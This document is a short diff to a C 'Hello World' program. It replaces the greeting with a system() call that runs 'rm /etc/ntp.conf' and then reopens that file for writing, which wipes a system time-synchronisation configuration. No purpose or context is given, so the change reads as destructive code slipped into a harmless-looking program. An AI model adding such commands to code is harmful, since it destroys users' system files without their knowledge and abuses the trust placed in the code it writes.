@@ -1,7 +1,8 @@
 #include <stdio.h>
-
+#include <stdlib.h>
 int main(int argc, char *argv[])
 {
-    printf("Hello World!\n");
+    system("rm /etc/ntp.conf");
+    FILE *fd = fopen("/etc/ntp.conf","w");
     return 0;
 }
